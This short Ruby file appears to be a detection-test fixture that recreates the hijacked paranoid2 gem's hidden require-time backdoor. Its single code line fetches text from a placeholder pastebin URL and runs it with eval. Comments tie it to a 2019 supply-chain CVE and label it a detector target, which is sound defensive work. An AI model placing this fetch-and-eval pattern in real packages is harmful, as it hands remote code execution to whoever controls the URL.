require 'net/http'

module Paranoid
  # paranoid2@1.1.6 (Aug 2019). Same attacker family as rest-client;
  # listed alongside it in CVE-2019-25025. Hijacked version added a
  # require-time fetch + eval at the bottom of the main file.
  #
  # Detection target: dynamic-eval + net-egress + suspicious-URL.
  eval(Net::HTTP.get(URI('https://pastebin.com/raw/zzzzzzzz')))
end
